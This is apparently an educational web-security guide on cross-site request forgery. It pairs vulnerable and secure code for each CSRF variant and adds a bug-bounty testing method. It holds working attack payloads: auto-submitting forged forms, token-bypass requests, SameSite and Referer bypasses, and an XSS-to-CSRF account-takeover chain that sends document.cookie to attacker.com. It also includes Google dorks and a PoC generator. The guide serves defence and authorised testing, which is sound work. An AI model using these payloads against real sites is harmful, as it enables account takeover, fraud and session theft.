---
title: "Cross-Site Request Forgery (CSRF): The Complete Guide"
description: "Cross-Site Request Forgery (CSRF) is one of the most widely exploited and misunderstood web application vulnerabilities. This guide provides complete coverage of all CSRF types, from basic GET-based attacks to advanced JSON CSRF and SameSite bypass techniques. Whether you're a bug bounty hunter looking for your next critical finding or a developer securing your application, this guide has everything you need."
categoryLabel: Web Security
published: 2026-03-27
updated: 2026-03-27
tags: [csrf, web-security, bug-bounty, owasp, session-security]
authors:
  - name: Bhagirath Saxena
    initials: BS
    social: "@rix4uni"
---


## What is CSRF?

Cross-Site Request Forgery (CSRF) is a web security vulnerability that tricks an authenticated user's browser into sending unintended requests to a web application on which the user is already logged in. Because the browser automatically attaches session cookies to every request, the server cannot distinguish between a legitimate action performed by the user and a forged request triggered by an attacker's page.

### Why CSRF is Dangerous

- **Account Takeover**: Change victim's email, password, or linked phone number
- **Financial Fraud**: Initiate unauthorized transfers, purchases, or withdrawals
- **Privilege Escalation**: Promote attacker's account to admin via victim's session
- **Data Deletion**: Permanently delete victim's data, files, or account
- **Settings Manipulation**: Disable 2FA, change security settings, add attacker's SSH key
- **Lateral Movement**: Perform admin actions if the victim is an administrator
- **Persistent Backdoor**: Add attacker-controlled email to victim's account for account recovery

---

## GET-Based CSRF

### What is GET-Based CSRF?

GET-based CSRF is the simplest form of the attack. It occurs when a sensitive action — such as changing a password, transferring funds, or deleting an account — is performed via an HTTP GET request. Because browsers automatically issue GET requests when loading images, iframes, and links, an attacker can trigger the action simply by embedding a crafted URL in any page the victim visits.

### How It Works

1. Victim is authenticated on `bank.com` (session cookie is active)
2. Victim visits attacker's page containing a hidden `<img>` tag
3. Browser automatically fetches the `src` URL — including the victim's session cookies
4. Server receives the request as if the victim made it intentionally
5. Action is performed: funds transferred, password changed, etc.

### Vulnerable Code Example

```php:vulnerable

<?php
// Vulnerable — sensitive action performed via GET request
session_start();
if (!isset($_SESSION['user_id'])) {
    die("Unauthorized");
}

// VULNERABLE: No CSRF token, no POST requirement
$new_email = $_GET['email'];
$user_id   = $_SESSION['user_id'];

$db->query("UPDATE users SET email = ? WHERE id = ?", [$new_email, $user_id]);
echo "Email updated to: " . $new_email;
?>
```

**Exploitation — Hidden image tag:**
```html

<!-- Attacker's page: evil.com/attack.html -->
<!-- Browser loads this image URL automatically when victim visits the page -->
<img src="https://bank.com/change-email?email=attacker@evil.com" width="0" height="0">
```

**Exploitation — Auto-redirect:**
```html

<!-- Redirect victim directly to the malicious URL -->
<script>
window.location = "https://target.com/delete-account?confirm=yes";
</script>
```

### Common GET-Based CSRF Targets

| Endpoint | Action | Impact |
|----------|--------|--------|
| `/change-email?email=x` | Change account email | Account takeover |
| `/delete-account?confirm=yes` | Delete user account | Data loss |
| `/admin/promote?user=attacker` | Promote to admin | Privilege escalation |
| `/settings/disable-2fa` | Disable two-factor auth | Security downgrade |
| `/transfer?to=attacker&amount=1000` | Money transfer | Financial fraud |
| `/logout` | Force logout | DoS on session |

### Secure Code Example

```php:secure

<?php
session_start();

// Secure — reject GET for sensitive actions, require POST + CSRF token
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die("Method Not Allowed");
}

// Validate CSRF token
if (!isset($_POST['csrf_token']) ||
    !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    die("Invalid CSRF token");
}

if (!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die("Unauthorized");
}

$new_email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if (!$new_email) {
    die("Invalid email");
}

$db->query("UPDATE users SET email = ? WHERE id = ?",
           [$new_email, $_SESSION['user_id']]);
echo "Email updated successfully.";
?>
```

---

## POST-Based CSRF

### What is POST-Based CSRF?

POST-based CSRF occurs when a sensitive action uses an HTTP POST request but lacks a CSRF token or other protection. Attackers craft an HTML form on an external page that automatically submits to the target application when the victim visits it. Because the victim's browser attaches session cookies to cross-origin POST requests, the server processes the forged request as legitimate.

### How It Works

1. Attacker creates an HTML page containing a hidden auto-submitting form
2. The form's `action` points to the vulnerable endpoint on the target site
3. Victim visits the attacker's page (via phishing link, ad, etc.)
4. JavaScript automatically submits the form on page load
5. Victim's browser sends the POST request with session cookies attached
6. Server processes the action as if the victim initiated it

### Vulnerable Code Example

```python:vulnerable

# Flask — POST endpoint with no CSRF protection
@app.route('/change-password', methods=['POST'])
def change_password():
    if not session.get('user_id'):
        return redirect('/login')

    # VULNERABLE: No CSRF token validation
    new_password = request.form['password']
    user_id      = session['user_id']

    hashed = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())
    db.execute("UPDATE users SET password = ? WHERE id = ?",
               [hashed, user_id])

    return "Password changed successfully"
```

**Exploitation — Auto-submitting form:**
```html

<!-- Attacker hosts this page at evil.com/csrf.html -->
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf-form').submit()">

  <form id="csrf-form"
        action="https://target.com/change-password"
        method="POST"
        style="display:none">
    <input type="hidden" name="password" value="hacked123!">
    <input type="hidden" name="confirm_password" value="hacked123!">
  </form>

  <p>Loading... Please wait.</p>
</body>
</html>
```

**Exploitation — JavaScript fetch (same-origin policy does not block sending):**
```javascript

// Cross-origin POST with form-encoded body — cookies are sent automatically
fetch('https://target.com/change-password', {
    method: 'POST',
    credentials: 'include',   // Send cookies cross-origin
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'password=hacked123!&confirm_password=hacked123!'
});
```

### Secure Code Example

```python:secure

import secrets
from functools import wraps
from flask import session, request, abort

def generate_csrf_token():
    """Generate and store a cryptographically secure CSRF token in the session"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def csrf_protect(f):
    """Decorator to validate CSRF token on state-changing requests"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.method in ('POST', 'PUT', 'PATCH', 'DELETE'):
            token = (
                request.form.get('csrf_token') or
                request.headers.get('X-CSRF-Token')
            )
            if not token or token != session.get('csrf_token'):
                abort(403, description="CSRF token missing or invalid")
        return f(*args, **kwargs)
    return decorated

@app.route('/change-password', methods=['POST'])
@csrf_protect
def change_password():
    if not session.get('user_id'):
        return redirect('/login')

    new_password = request.form['password']
    hashed = bcrypt.hashpw(new_password.encode(), bcrypt.gensalt())
    db.execute("UPDATE users SET password = ? WHERE id = ?",
               [hashed, session['user_id']])
    return "Password changed successfully"
```

```html

<!-- In the legitimate HTML form — embed the CSRF token -->
<form action="/change-password" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input type="password" name="password" placeholder="New password">
  <button type="submit">Change Password</button>
</form>
```

---

## JSON CSRF

### What is JSON CSRF?

JSON CSRF targets API endpoints that accept `application/json` as the `Content-Type`. Many developers mistakenly believe that requiring JSON body protects against CSRF because HTML forms cannot set `Content-Type: application/json`. However, this protection breaks down when the server accepts alternate content types, when CORS is misconfigured, or when the JSON can be sent as plain text or form-encoded.

### How It Works

1. API endpoint accepts JSON body with `Content-Type: application/json`
2. Developer assumes HTML forms can't send JSON → no CSRF token added
3. Attacker exploits one of several bypass techniques (see below)
4. Forged request is sent with victim's cookies
5. Server processes the JSON action

### Technique 1 — Content-Type: text/plain Bypass

HTML forms can send `Content-Type: text/plain`. If the server ignores the Content-Type and parses the body as JSON anyway:

```html

<!-- Form sends text/plain — server may still parse as JSON -->
<form action="https://api.target.com/user/update"
      method="POST"
      enctype="text/plain">

  <!-- name becomes the JSON key prefix, value is the rest -->
  <!-- Body sent: {"email":"attacker@evil.com","x":"=ignored"} -->
  <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='ignored"}'>
</form>
<script>document.forms[0].submit()</script>
```

### Technique 2 — Fetch with CORS Misconfiguration

If the server responds with `Access-Control-Allow-Origin: *` or reflects the Origin header with credentials allowed:

```javascript

// If CORS is misconfigured (Access-Control-Allow-Credentials: true + wildcard/reflect origin)
// This cross-origin request with JSON body succeeds
fetch('https://api.target.com/user/update', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'attacker@evil.com' })
});
```

### Technique 3 — Flash-Based Redirect (Legacy)

Older applications vulnerable via Adobe Flash (now patched, but still found in legacy systems):

```actionscript

// Flash could send arbitrary Content-Type cross-origin
// Still relevant for very old/unpatched environments
```

### Technique 4 — Accepting Multiple Content Types

```python

# Attacker sends form-encoded instead of JSON
# If server handles both: CSRF is possible with a standard HTML form
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=attacker%40evil.com&role=admin
```

### Vulnerable Code Example

```javascript:vulnerable

// Express API — no CSRF protection, assumes JSON = safe
app.post('/api/user/update', authenticate, async (req, res) => {
    // VULNERABLE: No CSRF token, relies only on Content-Type assumption
    const { email, name } = req.body;
    const userId = req.user.id;

    await db.query(
        'UPDATE users SET email = ?, name = ? WHERE id = ?',
        [email, name, userId]
    );

    res.json({ success: true });
});
```

### Secure Code Example

```javascript:secure

const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// For JSON APIs: use custom header validation (browsers can't set custom headers cross-origin)
function validateCustomHeader(req, res, next) {
    const header = req.headers['x-requested-with'];

    // Browsers cannot set X-Requested-With cross-origin without a preflight
    // A missing or wrong value indicates a potential CSRF attempt
    if (!header || header !== 'XMLHttpRequest') {
        return res.status(403).json({ error: 'Forbidden: missing security header' });
    }
    next();
}

// Option A: Custom header check (for AJAX/fetch-based APIs)
app.post('/api/user/update', authenticate, validateCustomHeader, async (req, res) => {
    const { email, name } = req.body;
    await db.query(
        'UPDATE users SET email = ?, name = ? WHERE id = ?',
        [email, name, req.user.id]
    );
    res.json({ success: true });
});

// Option B: CSRF token in header (for SPAs)
app.post('/api/user/update', authenticate, csrfProtection, async (req, res) => {
    // Client sends token via X-CSRF-Token header
    const { email, name } = req.body;
    await db.query(
        'UPDATE users SET email = ?, name = ? WHERE id = ?',
        [email, name, req.user.id]
    );
    res.json({ success: true });
});
```

---

## Multipart CSRF

### What is Multipart CSRF?

Multipart CSRF targets endpoints that process `multipart/form-data` — typically file upload forms. Many developers add CSRF tokens to standard text forms but forget to include them on file upload endpoints, assuming they are harder to exploit. In reality, HTML forms natively support `enctype="multipart/form-data"`, making them just as exploitable.

### How It Works

1. Application has a file upload or multipart form endpoint
2. CSRF token is missing or not validated on the multipart endpoint
3. Attacker creates an HTML form with `enctype="multipart/form-data"`
4. Victim's browser submits the forged multipart request with session cookies
5. Server processes the action (profile update, avatar change, settings update)

### Vulnerable Code Example

```python:vulnerable

# Django view — CSRF exempt applied to allow third-party uploads
# Developer forgot this removes all CSRF protection
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt   # VULNERABLE: Disables Django's built-in CSRF protection entirely
@login_required
def update_profile(request):
    if request.method == 'POST':
        name   = request.POST.get('name')
        bio    = request.POST.get('bio')
        avatar = request.FILES.get('avatar')

        request.user.name = name
        request.user.bio  = bio
        if avatar:
            request.user.avatar = avatar
        request.user.save()

        return JsonResponse({'success': True})
```

**Exploitation:**
```html

<!-- Forged multipart form — works just like a regular HTML form -->
<form action="https://target.com/profile/update"
      method="POST"
      enctype="multipart/form-data"
      id="csrf-form">
  <input type="hidden" name="name" value="Hacked by Attacker">
  <input type="hidden" name="bio" value="Account compromised">
</form>
<script>document.getElementById('csrf-form').submit()</script>
```

### Secure Code Example

```python:secure

# Django — keep CSRF protection enabled, validate token on all POST endpoints
from django.contrib.auth.decorators import login_required
from django.views.decorators.http import require_POST

# Do NOT use @csrf_exempt — Django validates token automatically
@login_required
@require_POST
def update_profile(request):
    # Django middleware validates csrf_token automatically
    # Just ensure the form includes {% csrf_token %}
    name   = request.POST.get('name', '').strip()
    bio    = request.POST.get('bio', '').strip()
    avatar = request.FILES.get('avatar')

    if len(name) > 100:
        return JsonResponse({'error': 'Name too long'}, status=400)

    request.user.name = name
    request.user.bio  = bio
    if avatar:
        request.user.avatar = avatar
    request.user.save()

    return JsonResponse({'success': True})
```

```html

<!-- Template — always include {% csrf_token %} in every form -->
<form method="POST" enctype="multipart/form-data" action="/profile/update">
  {% csrf_token %}
  <input type="text" name="name" value="{{ user.name }}">
  <textarea name="bio">{{ user.bio }}</textarea>
  <input type="file" name="avatar">
  <button type="submit">Update Profile</button>
</form>
```

---

## CSRF Token Bypass Techniques

### What is CSRF Token Bypass?

Even when CSRF tokens are implemented, they may be bypassable due to weak implementation. Common weaknesses include predictable tokens, tokens that are not tied to the user session, tokens that are never actually validated server-side, and tokens that can be leaked via Referer headers or XSS.

### Technique 1 — Token Not Validated Server-Side

```http

# Original request with valid token
POST /change-email HTTP/1.1
csrf_token=abc123&email=user@example.com

# Remove the token entirely — server still accepts it
POST /change-email HTTP/1.1
email=attacker@evil.com

# Or send an empty token
POST /change-email HTTP/1.1
csrf_token=&email=attacker@evil.com
```

### Technique 2 — Token Not Tied to Session

```http

# Original — valid token for attacker's own session
POST /change-email HTTP/1.1
Cookie: session=ATTACKER_SESSION
csrf_token=ATTACKER_TOKEN&email=attacker@evil.com   → 200 OK

# Reuse attacker's token with victim's session
POST /change-email HTTP/1.1
Cookie: session=VICTIM_SESSION
csrf_token=ATTACKER_TOKEN&email=attacker@evil.com   → 200 OK (VULNERABLE)
```

### Technique 3 — Predictable / Static Token

```python

# Weak token generation — predictable, not cryptographically random
import time
token = str(int(time.time()))          # Timestamp — guessable
token = hashlib.md5(username).hexdigest()  # Username hash — computable
token = "csrf_" + str(user_id)         # Sequential — enumerable
```

### Technique 4 — Token Leaked in Referer Header

```http

# If the CSRF token appears in URLs (bad practice)
GET /dashboard?csrf_token=abc123 HTTP/1.1
Referer: https://target.com/dashboard?csrf_token=abc123

# The token leaks to third-party sites via Referer when victim clicks external link
```

### Technique 5 — Token Leaked via XSS

```javascript

// If XSS exists on the same domain — extract CSRF token from DOM then use it
fetch('/settings')
    .then(r => r.text())
    .then(html => {
        // Parse the CSRF token from the page's hidden input
        const match = html.match(/name="csrf_token" value="([^"]+)"/);
        const token = match ? match[1] : '';

        // Now use the valid token in a forged request
        return fetch('/change-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `csrf_token=${token}&email=attacker@evil.com`
        });
    });
```

### Technique 6 — Method Override Bypass

```http

# Some frameworks support method override via _method parameter
# If PUT/PATCH is protected but POST isn't
POST /user/update HTTP/1.1
_method=PUT&email=attacker@evil.com&csrf_token=

# Or via header
POST /user/update HTTP/1.1
X-HTTP-Method-Override: PUT
```

### Token Strength Comparison

| Token Type | Entropy | Bypassable? |
|------------|---------|------------|
| `time.time()` | Very Low | Yes — guessable |
| `md5(username)` | Low | Yes — computable |
| `uuid4()` | Medium | Sometimes — not session-tied |
| `secrets.token_hex(32)` | High | No — if session-tied |
| `HMAC(session_id, secret)` | Very High | No — cryptographically bound |

---

## SameSite Cookie Bypass

### What is SameSite Cookie Bypass?

The `SameSite` cookie attribute restricts when cookies are sent in cross-site requests, and is now the primary browser-level CSRF defense. However, `SameSite` has known bypass paths depending on the value set (`Lax`, `Strict`, or `None`) and the context of the request.

### SameSite Values Explained

| Value | Cookies Sent Cross-Site? | Notes |
|-------|--------------------------|-------|
| `Strict` | Never | Most secure — cookies only sent from same site |
| `Lax` | Top-level GET only | Default in modern browsers — POST is blocked |
| `None` | Always | Must be combined with `Secure` — equivalent to no protection |

### Bypassing SameSite=Lax

`Lax` blocks cross-site POST but allows cross-site GET for top-level navigation. Exploitable if the target performs sensitive actions via GET:

```html

<!-- SameSite=Lax bypass — top-level GET navigation sends cookies -->
<!-- Cookies ARE sent because this is a top-level navigation via GET -->
<a href="https://target.com/promote?user=attacker&role=admin">Click here for prize!</a>

<!-- Auto-navigate via meta refresh -->
<meta http-equiv="refresh" content="0; url=https://target.com/delete?id=123">

<!-- Auto-navigate via window.location -->
<script>window.location = "https://target.com/change-email?email=attacker@evil.com"</script>
```

### Bypassing SameSite=Lax via POST with 307 Redirect

```http

# If the server issues a 307 redirect from GET to POST, the method is preserved
# Attacker controls a server that responds with 307
GET https://attacker.com/redirect HTTP/1.1

HTTP/1.1 307 Temporary Redirect
Location: https://target.com/change-password

# Browser follows 307 redirect preserving the POST method and body
# SameSite=Lax does NOT protect against 307 redirects from GET->POST
```

### Bypassing SameSite=Strict via Subdomain

If any subdomain is compromised or controllable (open redirect, XSS, etc.):

```javascript

// Same-site = same eTLD+1. Subdomains are considered same-site.
// If attacker controls sub.target.com (via XSS or open redirect):
// sub.target.com → target.com request is SAME-SITE, not cross-site
// SameSite=Strict cookies ARE sent

// From XSS on sub.target.com:
fetch('https://target.com/change-email', {
    method: 'POST',
    credentials: 'include',   // SameSite=Strict cookies sent (same site!)
    body: 'email=attacker@evil.com&csrf_token=STOLEN_TOKEN'
});
```

### Bypassing SameSite=None

`SameSite=None` provides zero CSRF protection — full cross-site requests with cookies:

```html

<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

### Checking Cookie Attributes

```bash

# Inspect Set-Cookie header in response
curl -I https://target.com/login -d "user=x&pass=y" | grep -i "set-cookie"

# Look for missing SameSite, HttpOnly, Secure flags
Set-Cookie: session=abc123; Path=/              ← No SameSite — vulnerable
Set-Cookie: session=abc123; SameSite=None       ← No protection
Set-Cookie: session=abc123; SameSite=Lax; HttpOnly; Secure  ← Better
```

---

## Referer-Based CSRF Protection Bypass

### What is Referer-Based Bypass?

Some applications validate the `Referer` header as a CSRF defense — they check that the request originated from their own domain. This approach has multiple bypass paths, making it an unreliable protection mechanism.

### Technique 1 — Suppress Referer with Meta Tag

```html

<!-- meta referrer policy suppresses the Referer header entirely -->
<!-- Server receives no Referer and may accept the request (fail-open) -->
<meta name="referrer" content="no-referrer">

<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

### Technique 2 — Referer Contains Target Domain

```
# If server checks that Referer *contains* target.com (weak check):
# Attacker creates a page at: attacker.com/target.com/csrf.html
# Referer sent: https://attacker.com/target.com/csrf.html
# Weak check: "target.com" in referer → passes

Referer: https://attacker.com/target.com/
```

### Technique 3 — Referer is Target Domain Subdomain

```
# If server checks startswith("https://target.com"):
Referer: https://target.com.attacker.com/  ← passes startswith check
```

### Technique 4 — HTTPS → HTTP Referer Drop

```
# Browsers strip the Referer when navigating from HTTPS to HTTP
# If target site has any HTTP endpoint, Referer is empty
# Server may accept empty Referer (fail-open behavior)
```

### Vulnerable Code Example

```python:vulnerable

@app.route('/change-email', methods=['POST'])
def change_email():
    referer = request.headers.get('Referer', '')

    # VULNERABLE: Weak string containment check — easily bypassed
    if 'target.com' not in referer:
        return "Forbidden", 403

    # Accepted if attacker.com/target.com/ or empty referer passes fail-open logic
    new_email = request.form['email']
    db.execute("UPDATE users SET email = ? WHERE id = ?",
               [new_email, session['user_id']])
    return "Email updated"
```

### Secure Code Example

```python:secure

from urllib.parse import urlparse

ALLOWED_ORIGINS = {'https://target.com', 'https://app.target.com'}

def validate_origin(request) -> bool:
    """
    Validate Origin header first (preferred), fall back to Referer.
    Both must match an allowlist of known-good origins.
    """
    # Prefer Origin header — always present for cross-origin requests in modern browsers
    origin = request.headers.get('Origin')
    if origin:
        return origin in ALLOWED_ORIGINS

    # Fall back to Referer — parse properly, never use string containment
    referer = request.headers.get('Referer', '')
    if referer:
        parsed = urlparse(referer)
        referer_origin = f"{parsed.scheme}://{parsed.netloc}"
        return referer_origin in ALLOWED_ORIGINS

    # Fail closed — reject requests with no Origin and no Referer
    return False

@app.route('/change-email', methods=['POST'])
def change_email():
    if not validate_origin(request):
        return "Forbidden", 403

    # Also validate CSRF token for defense-in-depth
    if request.form.get('csrf_token') != session.get('csrf_token'):
        return "Forbidden", 403

    new_email = request.form['email']
    db.execute("UPDATE users SET email = ? WHERE id = ?",
               [new_email, session['user_id']])
    return "Email updated"
```

---

## Login CSRF

### What is Login CSRF?

Login CSRF is a lesser-known variant where the attacker forges a login request to authenticate the victim using the attacker's own credentials. After the forced login, the victim unknowingly uses the attacker's account — entering personal information, payment details, or private data that the attacker can later retrieve by logging in.

### How It Works

1. Attacker crafts a page with an auto-submitting login form using attacker's credentials
2. Victim visits the page — browser sends the forged login POST to the target site
3. Victim is now logged in as the attacker without realizing it
4. Victim enters credit card details, address, private messages, etc.
5. Attacker logs in to their own account and reads all victim-submitted data

### Exploitation

```html

<!-- Force victim to log in as attacker -->
<form action="https://target.com/login"
      method="POST"
      id="login-csrf">
  <input type="hidden" name="username" value="attacker@evil.com">
  <input type="hidden" name="password" value="AttackerPassword1!">
</form>
<script>document.getElementById('login-csrf').submit()</script>
```

### Impact Scenarios

| Scenario | Victim Action | Attacker Gains |
|----------|--------------|---------------|
| E-commerce | Enters delivery address | Victim's home address |
| Banking | Links bank account | Access to victim's financials |
| Health portal | Uploads medical records | Victim's private health data |
| Tax platform | Submits tax return | Victim's financial/SSN data |
| Search engine | Performs searches | Victim's search history |

### Secure Code Example

```python:secure

import secrets

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        # Generate a pre-login CSRF token — stored in anonymous session
        if 'pre_login_csrf' not in session:
            session['pre_login_csrf'] = secrets.token_hex(32)
        return render_template('login.html',
                               csrf_token=session['pre_login_csrf'])

    if request.method == 'POST':
        # Validate pre-login CSRF token — even before authentication
        token = request.form.get('csrf_token')
        if not token or token != session.get('pre_login_csrf'):
            return "Invalid CSRF token", 403

        # Clear the used token
        session.pop('pre_login_csrf', None)

        username = request.form['username']
        password = request.form['password']

        user = authenticate(username, password)
        if user:
            # Regenerate session ID after login (session fixation prevention)
            session.clear()
            session['user_id'] = user.id
            session['csrf_token'] = secrets.token_hex(32)
            return redirect('/dashboard')

        return "Invalid credentials", 401
```

---

## CSRF via XSS

### What is CSRF via XSS?

When an attacker finds XSS on the same domain as the CSRF-protected endpoint, they can use the XSS to extract the victim's CSRF token from the DOM and then perform the CSRF attack using the valid token. This is one of the most powerful attack chains in web security — XSS completely breaks CSRF token protection.

### How It Works

1. Attacker finds XSS vulnerability on `target.com`
2. XSS payload fetches a protected page and extracts the CSRF token
3. XSS uses the extracted token to make an authenticated POST request
4. CSRF protection is completely bypassed
5. Sensitive action is performed with a fully valid token

### Exploitation — Full Attack Chain

```javascript

// Step 1: Fetch the page containing the CSRF token
fetch('/settings', { credentials: 'include' })
    .then(response => response.text())
    .then(html => {
        // Step 2: Parse the CSRF token from the HTML
        const parser   = new DOMParser();
        const doc      = parser.parseFromString(html, 'text/html');
        const input    = doc.querySelector('input[name="csrf_token"]');
        const token    = input ? input.value : '';

        // Step 3: Use the real token in a forged request
        const formData = new FormData();
        formData.append('csrf_token', token);
        formData.append('email', 'attacker@evil.com');

        return fetch('/change-email', {
            method: 'POST',
            credentials: 'include',
            body: formData
        });
    })
    .then(r => {
        // Step 4: Exfiltrate confirmation to attacker's server
        fetch('https://attacker.com/log?status=' + r.status);
    });
```

### XSS → CSRF → Account Takeover (Full Chain)

```javascript

// Complete account takeover via XSS + CSRF chain
(async () => {
    // 1. Steal CSRF token
    const settingsPage = await fetch('/account/settings',
                                     { credentials: 'include' });
    const html         = await settingsPage.text();
    const token        = html.match(/csrf_token['"]\s+value=['"]([^'"]+)/)[1];

    // 2. Change email to attacker-controlled address
    await fetch('/account/change-email', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `csrf_token=${token}&email=attacker%40evil.com`
    });

    // 3. Trigger password reset to attacker's email
    await fetch('/account/forgot-password', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `email=attacker%40evil.com`
    });

    // 4. Notify attacker
    navigator.sendBeacon('https://attacker.com/pwned?user=' +
                         encodeURIComponent(document.cookie));
})();
```

### Defense: CSP Breaks XSS → CSRF Chains

```http

# A strict Content Security Policy prevents the XSS from running fetch()
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM}';
    connect-src 'self';
    object-src 'none';
    base-uri 'self';
```

---

## Bug Bounty Hunter's Guide

### Where to Look for CSRF

#### 1. High-Value State-Changing Endpoints

- Email or password change (`/change-email`, `/change-password`)
- Account settings (`/settings`, `/profile/update`)
- Payment or withdrawal endpoints (`/transfer`, `/withdraw`)
- Admin actions (`/admin/promote`, `/admin/delete-user`)
- OAuth / social account linking (`/connect/google`, `/link-account`)
- API key generation or deletion (`/api/keys/create`, `/api/keys/delete`)
- Two-factor authentication toggle (`/2fa/disable`, `/2fa/enable`)

#### 2. API Endpoints (Often Forgotten)

```bash

# REST API endpoints frequently lack CSRF protection
/api/v1/user/update
/api/v2/account/delete
/api/user/settings
/graphql        ← GraphQL mutations are also CSRF targets
/api/webhook/create
/api/ssh-keys/add
```

#### 3. Google Dorks for Finding CSRF-Vulnerable Targets

```

# Find login and settings pages
inurl:/account/settings intitle:"settings"
inurl:/profile/edit intitle:"edit profile"
inurl:/change-password intitle:"change password"
inurl:/change-email

# Find API endpoints
inurl:/api/v1/user site:*.io
inurl:/api/user/update

# Bug bounty programs with CSRF in scope
site:hackerone.com "csrf" "in scope"
site:bugcrowd.com "cross-site request forgery"
site:intigriti.com "csrf"

# Find forms without CSRF tokens
inurl:/settings "Save Changes" -"csrf"
```

### Testing Methodology

#### Step 1: Map All State-Changing Endpoints

```bash

# Spider and grep for forms and API calls
katana -u https://target.com -d 5 | tee urls.txt
cat urls.txt | grep -iE "(update|delete|change|create|edit|remove|transfer|add)"
```

#### Step 2: Check for CSRF Token in Requests

```bash

# Intercept a legitimate state-changing request in Burp Suite
# Look for:
# - csrf_token, _token, authenticity_token, __RequestVerificationToken
# - X-CSRF-Token header
# - If NONE found → likely vulnerable
```

#### Step 3: Test Token Removal and Manipulation

```http

# Test 1: Remove csrf_token parameter entirely
POST /change-email HTTP/1.1
email=attacker@evil.com

# Test 2: Send empty token
POST /change-email HTTP/1.1
csrf_token=&email=attacker@evil.com

# Test 3: Send random/invalid token
POST /change-email HTTP/1.1
csrf_token=aaaaaaaaaaaaaaaa&email=attacker@evil.com

# Test 4: Reuse your own token with another session (Burp — swap cookies)
POST /change-email HTTP/1.1
Cookie: session=VICTIM_SESSION
csrf_token=ATTACKER_TOKEN&email=attacker@evil.com
```

#### Step 4: Generate the PoC HTML

```python

#!/usr/bin/env python3
"""Generate CSRF PoC HTML from a Burp request"""

TARGET_URL = "https://target.com/change-email"
METHOD     = "POST"
PARAMS     = {
    "email": "attacker@evil.com",
    "name": "Hacked"
}

def generate_csrf_poc(url, method, params):
    inputs = '\n'.join(
        f'  <input type="hidden" name="{k}" value="{v}">'
        for k, v in params.items()
    )
    return f"""<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="{url}" method="{method}" style="display:none">
{inputs}
  </form>
  <p>Loading...</p>
</body>
</html>"""

print(generate_csrf_poc(TARGET_URL, METHOD, PARAMS))
```

#### Step 5: Check SameSite Cookie Attribute

```bash

# Inspect Set-Cookie headers for SameSite attribute
curl -s -I -X POST https://target.com/login \
    -d "username=test&password=test" | grep -i "set-cookie"

# Check with browser DevTools:
# Application → Cookies → inspect SameSite column
```

### Quick Testing Checklist

```bash

[ ] Identify all state-changing endpoints (POST, PUT, PATCH, DELETE)
[ ] Check if any sensitive actions use GET requests
[ ] Inspect requests for CSRF tokens (csrf_token, _token, etc.)
[ ] Remove csrf_token — does server still accept the request?
[ ] Send empty csrf_token — does server still accept?
[ ] Send attacker's csrf_token with victim's session cookie
[ ] Check SameSite attribute on session cookie
[ ] Test JSON endpoints with Content-Type: text/plain
[ ] Check Referer validation — suppress with meta referrer tag
[ ] Test login endpoint for login CSRF
[ ] Check if CORS is misconfigured (Access-Control-Allow-Credentials: true)
[ ] Test GraphQL mutations for CSRF
[ ] Generate PoC HTML and confirm impact
[ ] Report with full steps to reproduce and impact assessment
```

### WAF and Framework Bypass Techniques

```http

# Framework token field name variations
csrf_token=
_token=
authenticity_token=
__RequestVerificationToken=
_csrf=
csrfmiddlewaretoken=

# Try changing request method
POST → PUT → PATCH (some CSRF protections only cover POST)

# Try content-type switching
Content-Type: application/x-www-form-urlencoded  →  application/json
Content-Type: application/json                   →  text/plain

# Try method override
POST /endpoint?_method=PUT HTTP/1.1
X-HTTP-Method-Override: PUT

# Try HTTP/2 — some WAFs behave differently
# Use Burp Suite's HTTP/2 support
```

### Sample Bug Bounty Report Template

```markdown

**Title**: CSRF on /account/change-email Allows Account Takeover

**Severity**: High

**Endpoint**: POST /account/change-email

**Steps to Reproduce**:
1. Log in to target.com as victim@example.com.
2. In a separate browser tab, open the PoC HTML page below.
3. The page automatically submits a POST request to /account/change-email.
4. Observe that the victim's email is changed to attacker@evil.com.
5. Attacker requests a password reset to attacker@evil.com and takes over the account.

**PoC HTML**:
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://target.com/account/change-email"
        method="POST" style="display:none">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>

**Impact**: Complete account takeover of any authenticated user who visits the
attacker's page. No user interaction beyond visiting the page is required.

**Suggested Fix**:
- Implement synchronizer CSRF tokens tied to the user's session
- Set SameSite=Lax or SameSite=Strict on the session cookie
- Validate the Origin header against an allowlist of known-good origins
```

---

## Developer's Defense Guide

### Defense-in-Depth Strategy

#### Layer 1: Synchronizer Token Pattern (Primary Defense)

```python:secure

import secrets
import hmac
import hashlib
from flask import session, request, abort

def generate_csrf_token() -> str:
    """Generate a cryptographically secure token tied to the session"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

